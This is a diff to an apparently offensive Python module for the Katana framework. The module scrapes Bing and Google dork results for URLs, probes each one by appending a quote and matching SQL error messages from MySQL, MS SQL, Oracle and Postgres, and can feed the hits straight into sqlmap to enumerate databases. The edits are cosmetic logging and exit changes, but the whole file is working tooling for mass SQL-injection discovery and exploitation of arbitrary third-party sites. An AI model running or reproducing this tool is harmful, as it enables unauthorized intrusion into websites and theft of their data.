@@ -1,7 +1,7 @@
 # This module requires katana framework 
 # https://github.com/PowerScript/KatanaFramework
 #
-# For adding module: sudo python2 ktf.ktf path/to/file/without/file/extention
+# For adding module: sudo python2 ktf.ktf --i-module path/to/file/without/file/extention
 #
 
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
@@ -30,7 +30,7 @@ from bs4 import BeautifulSoup	# Working with website date
 
 # INFORMATION MODULE
 def init():
-	init.Author				="ThomasTJ 2016 (TTJ)"
+	init.Author				="2016 ThomasTJ (TTJ)"
 	init.Version			="1.0"
 	init.Description		="Google Dork website there are prone to SQL injections."
 	init.CodeName			="mcs/gd.sql"
@@ -50,7 +50,7 @@ def init():
 		'startpage'			:["1"			,True ,'Startpage'],
 		'timeout'			:["5"			,True ,'Break between requests'],
 		'savesearch'		:["results"		,True ,'Save urls {filename}'],
-		'verbose'			:["0"			,False,'Verboselevel: 0,1,2,3'],
+		'verbose'			:["1"			,False,'Verboselevel: 0,1,2,3'],
 		'sqlmap'			:["n"			,False,'sqlmap on results y/n'],
 	}
 	init.aux = """
@@ -66,12 +66,13 @@ def init():
 
 # CODE MODULE	############################################################################################
 def main(run):
-	print("  #======================================#")
-	print("  #										")
-	print("  # Find urls which might is vuln for 	")
-	print("  #		  SQL injections				")
-	print("  #										")
-	print("  #======================================#")
+	
+	###############################
+	# Crawl the web for URLs
+	###############################
+	
+	print("\n")
+	printAlert(0, "Find urls which might is vuln for SQL injections")
 	
 	#=================================
 	# Make variables ready to use
@@ -94,8 +95,8 @@ def main(run):
 	
 	rawdata = "tmp/rawurl"
 	
-	print("  [*]  Searching")
-	print("  [+]  Results")
+	printAlert(0, "Searching")
+	printAlert(0, "Results")
 	
 	
 	#=================================
@@ -110,14 +111,14 @@ def main(run):
 			counturls = 0
 			pagenr = int(start)*int(count)+1
 			address = "http://www.bing.com/search?q=instreamset:(url title):" + stringurl + "&count=" + count + "&first=" + str(pagenr)
-			print("  [*]  Page number: " + str(int(start)+1))
+			printAlert(0, "Page number: " + str(int(start)+1))
 			r = requests.get(address)
 			soup = BeautifulSoup(r.text, 'lxml')
 			for d in soup.find_all('h2'):
 				for a in d.find_all('a', href=True):
 					if string in a['href']:
 						if verboseactive in ('1', '2', '3'):
-							print("  [+]  " + a['href'])
+							print("       " + a['href'])
 						with open(rawdata, 'a') as file:
 							file.write(a['href'] + "\n")
 							counturls = counturls + 1
@@ -125,8 +126,8 @@ def main(run):
 						pass
 					else:
 						pass
-			print("  [+]  Urls captured: " + str(counturls))
-			print("  [*]  Sleeping for " + str(sleeptime) + " seconds")
+			printAlert(3, "Urls captured: " + str(counturls))
+			printAlert(0, "Sleeping for " + str(sleeptime) + " seconds")
 			sleep(sleeptime)   
 
 		#=========================
@@ -137,19 +138,19 @@ def main(run):
 			pagenr = int(start)*int(count)
 			address = "https://www.google.dk/search?q=" + stringurl + "&num=" + count + "&start=" + str(pagenr)
 			#address = "https://www.google.dk/search?q=inurl%3A" + stringurl + "&num=" + count + "&start=" + str(pagenr)
-			print("  [*]  Page number: " + str(int(start)+1))
+			printAlert(0, "Page number: " + str(int(start)+1))
 			r = requests.get(address)
 			soup = BeautifulSoup(r.text, 'lxml')
 			for d in soup.find_all('cite'):
 				url = d.text
 				if string in url:
 					if verboseactive in ('1', '2', '3'):	
-						print("  [+]  " + url)
+						print("       " + url)
 					with open(rawdata, 'a') as file:
 						file.write(url + "\n")
 						counturls = counturls + 1
-			print("  [+]  Urls captured: " + str(counturls))
-			print("  [*]  Sleeping for " + str(sleeptime) + " seconds")
+			printAlert(3, "Urls captured: " + str(counturls))
+			printAlert(0, "Sleeping for " + str(sleeptime) + " seconds")
 			sleep(sleeptime)
 			
 		try:
@@ -158,44 +159,50 @@ def main(run):
 		#=============================
 		# Error, end, exit
 		#=============================
+		# No value - gotta die
 		except KeyboardInterrupt:
-			print("  User input - Ctrl + c")
+			printAlert(0, "User input - Ctrl + c")
 			quitnow = input ("	Exit program (y/N): ")
 			if quitnow == "y":
-				print("  // Exiting\n\n")
-				sys.exit()
+				printAlert(3, "Exiting\n\n")
+				return None
 			else:
-				print("  // Continuing\n\n")
+				printAlert(3, "Continuing\n\n")
 		except:
-			print("  ERROR!!! ")
+			printAlert(1, "ERROR!!! ")
 	
 	
 	#=================================
 	# Done - sum it up
 	#=================================
-	printAlert(0," Done scraping")
+	printAlert(0,"Done scraping")
 	#if savesearch == "y":
-	with open(rawdata) as f:
-		resultsnumber = sum(1 for _ in f)
-	printAlert(0," Total saved urls:  " + str(resultsnumber))
-	printAlert(0," Getting ready for checking urls")
+	if os.path.isfile(rawdata): 
+		with open(rawdata) as f:
+			resultsnumber = sum(1 for _ in f)
+	else:
+		printAlert(6, "No URLs captured. Exiting.")
+		return None
+	printAlert(0,"Total saved urls:  " + str(resultsnumber))
+	printAlert(0,"Getting ready for checking urls")
 	sleep(1)
 	
-	print("  #==================================#")
-	print("  #									")
-	print("  #   Check if urls is vuln for		")
-	print("  #		 SQL injection				")
-	print("  #									")
-	print("  #==================================#")
+	
+	###############################
+	# Check URLs for vuln
+	###############################
+	
+	print("\n")
+	printAlert(0, "Check if urls is vuln for SQL injections")
 	
 	#=================================
 	# Base input
 	#=================================
 	
 	
-	print("\n  [*]  Reading raw url file")
-	print("  [*]  Connecting")
-	print("  [*]  Checking URL's")
+	printAlert(0, "Reading raw url file")
+	printAlert(0, "Connecting")
+	printAlert(0, "Checking URL's")
 	
 	#=================================
 	# Loop through urls and add a qoute
@@ -221,7 +228,7 @@ def main(run):
 				line = line.rstrip('\n')
 				url = line + "'"
 				if verboseactive in ('1', '2', '3'):	
-					print("  [*]  " + line.strip('\n'))
+					printAlert(0, line.strip('\n'))
 				r = requests.get(url, verify=False, timeout=4)
 				soup = BeautifulSoup(r.text, 'lxml')
 
@@ -245,18 +252,18 @@ def main(run):
 				
 				# Verbose level 2
 				if verboseactive == "2":
-					print("  [V]  Check1 MySQL found:	" + str(checkMY1))
-					print("  [V]  Check2 MySQL found:	" + str(checkMY2))
-					print("  [V]  Check3 MySQL found:	" + str(checkMY3))
-					print("  [V]  Check4 MySQL found:	" + str(checkMY4))
-					print("  [V]  Check5 MS SQL found:   " + str(checkMS1))
-					print("  [V]  Check6 MS SQL found:   " + str(checkMS2))
-					print("  [V]  Check7 MS SQL found:   " + str(checkMS3))
-					print("  [V]  Check8 Oracle found:   " + str(checkOR1))
-					print("  [V]  Check9 Oracle found:   " + str(checkOR2))
-					print("  [V]  Check10 Oracle found:  " + str(checkOR3))
-					print("  [V]  Check11 Postgre found: " + str(checkPO1))
-					print("  [V]  Check12 Postgre found: " + str(checkPO2))
+					printAlert(0, "[V]  Check1 MySQL found:	" + str(checkMY1))
+					printAlert(0, "[V]  Check2 MySQL found:	" + str(checkMY2))
+					printAlert(0, "[V]  Check3 MySQL found:	" + str(checkMY3))
+					printAlert(0, "[V]  Check4 MySQL found:	" + str(checkMY4))
+					printAlert(0, "[V]  Check5 MS SQL found:   " + str(checkMS1))
+					printAlert(0, "[V]  Check6 MS SQL found:   " + str(checkMS2))
+					printAlert(0, "[V]  Check7 MS SQL found:   " + str(checkMS3))
+					printAlert(0, "[V]  Check8 Oracle found:   " + str(checkOR1))
+					printAlert(0, "[V]  Check9 Oracle found:   " + str(checkOR2))
+					printAlert(0, "[V]  Check10 Oracle found:  " + str(checkOR3))
+					printAlert(0, "[V]  Check11 Postgre found: " + str(checkPO1))
+					printAlert(0, "[V]  Check12 Postgre found: " + str(checkPO2))
 					
 				# Verbose level 3
 				if verboseactive == "3":
@@ -264,78 +271,82 @@ def main(run):
 					checkverMY2 = soup.find(text=re.compile(r'SQL syntax'))
 					checkverMY3 = soup.find(text=re.compile(r'server version for the right syntax'))
 					checkverMY4 = soup.find(text=re.compile('expects parameter 1 to be'))
-					print("  [V]  Check1 MySQL found:	" + str(checkverMY1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-					print("  [V]  Check2 MySQL found:	" + str(checkverMY2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-					print("  [V]  Check3 MySQL found:	" + str(checkverMY3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-					print("  [V]  Check4 MySQL found:	" + str(checkverMY4).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+					printAlert(0, "[V]  Check1 MySQL found:	" + str(checkverMY1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+					printAlert(0, "[V]  Check2 MySQL found:	" + str(checkverMY2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+					printAlert(0, "[V]  Check3 MySQL found:	" + str(checkverMY3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+					printAlert(0, "[V]  Check4 MySQL found:	" + str(checkverMY4).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
 					
 					checkverMS1 = soup.find(text=re.compile('Unclosed quotation mark before the character string'))
 					checkverMS2 = soup.find(text=re.compile('An unhanded exception occurred during the execution'))
 					checkverMS3 = soup.find(text=re.compile('Please review the stack trace for more information'))
-					print("  [V]  Check5 MS SQL found:   " + str(checkverMS1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-					print("  [V]  Check6 MS SQL found:   " + str(checkverMS2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-					print("  [V]  Check7 MS SQL found:   " + str(checkverMS3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+					printAlert(0, "[V]  Check5 MS SQL found:   " + str(checkverMS1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+					printAlert(0, "[V]  Check6 MS SQL found:   " + str(checkverMS2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+					printAlert(0, "[V]  Check7 MS SQL found:   " + str(checkverMS3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
 					
 					checkverOR1 = soup.find(text=re.compile('java.sql.SQLException: ORA-00933'))
 					checkverOR2 = soup.find(text=re.compile('SQLExceptionjava.sql.SQLException'))
 					checkverOR3 = soup.find(text=re.compile('quoted string not properly terminated'))
-					print("  [V]  Check8 Oracle found:   " + str(checkverOR1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-					print("  [V]  Check9 Oracle found:   " + str(checkverOR2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-					print("  [V]  Check10 Oracle found:  " + str(checkverOR3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+					printAlert(0, "[V]  Check8 Oracle found:   " + str(checkverOR1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+					printAlert(0, "[V]  Check9 Oracle found:   " + str(checkverOR2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+					printAlert(0, "[V]  Check10 Oracle found:  " + str(checkverOR3).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
 
 					checkverPO1 = soup.find(text=re.compile('Query failed:'))
 					checkverPO2 = soup.find(text=re.compile('unterminated quoted string at or near'))
-					print("  [V]  Check11 Postgre found: " + str(checkverPO1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
-					print("  [V]  Check12 Postgre found: " + str(checkverPO2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+					printAlert(0, "[V]  Check11 Postgre found: " + str(checkverPO1).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
+					printAlert(0, "[V]  Check12 Postgre found: " + str(checkverPO2).replace('\n', ' ').replace('\r', '').replace('\t', '').replace('  ', ''))
 				
 				# If X is vuln
 				if (checkMY1 > 0 or checkMY2 > 0 or checkMY3 > 0 or checkMY4 > 0 or checkMS1 > 0 or checkMS2 > 0 or checkMS3 > 0 or checkOR1 > 0 or checkOR2 > 0 or checkOR3 > 0 or checkPO1 > 0 or checkPO2):
+					# VULN
 					if verboseactive in ('1', '2', '3'):	
-						print("  [+]  " + line)
+						printAlert(3, line)
 					with open(filename, 'a') as file:
 						file.write(line+"\n")
 				else:
+					# NOT VULN
 					if verboseactive in ('1', '2', '3'):	
-						print("  [-]  " + line)
+						printAlert(6, line)
 			
 			# Skip X or/and exit
 			except KeyboardInterrupt:
-				print("  [X]  " + line)
+				printAlert(1, "  " + line)
 				quitnow = input ("  Exit program (y/N): ")
 				if quitnow == "y":
-					print("  // Exiting\n\n")
-					sys.exit()
+					printAlert(0, "Exiting\n\n")
+					commands.getoutput('rm '+rawdata+' > null')
+					return None
 				else:
-					print("  // Continuing\n\n")
+					printAlert(0, "Continuing\n\n")
 					
 			# Bad X
 			except:
 				if verboseactive in ('1', '2', '3'):	
-					print("  [X]  Timeout or error in URL")
+					printAlert(6, "Timeout or error in URL")
 			
 			   
 			   
 	#=================================
 	# Done - sum it up
 	#=================================
-	printAlert(0," Done scanning urls")
 	commands.getoutput('rm '+rawdata+' > null')
-	with open(filename) as f:
-		resultsnumber = sum(1 for _ in f)
-	printAlert(0," Scraping saved in file: " + filename)
-	printAlert(0," Total saved urls:  " + str(resultsnumber))
-	if resultsnumber == 0:
-		print("  No vuln urls, exiting\n\n")
-		sys.exit()
-		
+	printAlert(0, "Done scanning urls")
+	if os.path.isfile(filename): 
+		with open(filename) as f:
+			resultsnumber = sum(1 for _ in f)
+	else:
+		printAlert(1, "No vuln urls, exiting\n\n")
+		return None
+	printAlert(0, "Scraping saved in file: " + filename)
+	printAlert(0, "Total saved urls:  " + str(resultsnumber))
+	
+	
+	###############################
+	# Run the URLs through sqlmap
+	###############################
 	
 	if init.var['sqlmap'] == "y":
-		print("  #===============================#")
-		print("  #							   ")
-		print("  #  Scan urls with		 ")
-		print("  #		SQLmap			 ")
-		print("  #							   ")
-		print("  #===============================#")
+		print("\n")
+		printAlert(0, "Scan urls with SQLmap")
 		
 		#=================================
 		# Check if sqlmap installed, file, etc.
@@ -343,39 +354,39 @@ def main(run):
 	
 		#if shutil.which('sqlmap') is None: # python3
 		if find_executable('sqlmap') is None:
-			print("  SQLmap is not installed on system - can't go on.")
-			print("  Install sqlmap and run command below (sudo pacman -S sqlmap, sudo apt-get install sqlmap, etc.)")
-			print("  \nCommand:")
-			print("  sqlmap -m \"" + filename + "\n")
-			sys.exit()
+			printAlert(6, "SQLmap is not installed on system - can't go on.")
+			printAlert(0, "Install sqlmap and run command below (sudo pacman -S sqlmap, sudo apt-get install sqlmap, etc.)")
+			printAlert(0, "\nCommand:")
+			printAlert(0, "sqlmap -m \"" + filename + "\n")
+			return None
 	
-		printAlert(0," SQLmap will be started with arguments dbs, batch, random-agent, 4xthreads.")
+		printAlert(0, "SQLmap will be started with arguments dbs, batch, random-agent, 4xthreads.")
 
 		fileDestination = (os.getcwd() + "/" + filename)
 		command = ('sqlmap -m ' + fileDestination + " --dbs --batch --random-agent --threads 4")
-		printAlert(0," Command to execute: " + command)
-		printAlert(0," Press Ctrl + c to exit")
-		printAlert(0," Starting sqlmap in 5 sec: " + command)
-		print("  [*]  5..")
+		printAlert(0, "Command to execute: " + command)
+		printAlert(0, "Press Ctrl + c to exit")
+		printAlert(0, "Starting sqlmap in 5 sec: " + command)
+		printAlert(0, "5..")
 		sleep(1)
-		print("  [*]  4..")
+		printAlert(0, "4..")
 		sleep(1)
-		print("  [*]  3..")
+		printAlert(0, "3..")
 		sleep(1)
-		print("  [*]  2..")
+		printAlert(0, "2..")
 		sleep(1)
-		print("  [*]  1..")
+		printAlert(0, "1..")
 		sleep(1)
 		
-		print("  [*]  Starting SQLmap - follow onscreen instructions")
+		printAlert(0, "Starting SQLmap - follow onscreen instructions")
 		
 		# RUN SQLMAP !!
 		#commands.getoutput(command)
 		os.system(command)
 		
 	else:
-		printAlert(0," Exiting")
-		sys.exit()
+		printAlert(0,"Exiting")
+		return None
 	
 	
 # END CODE MODULE ############################################################################################
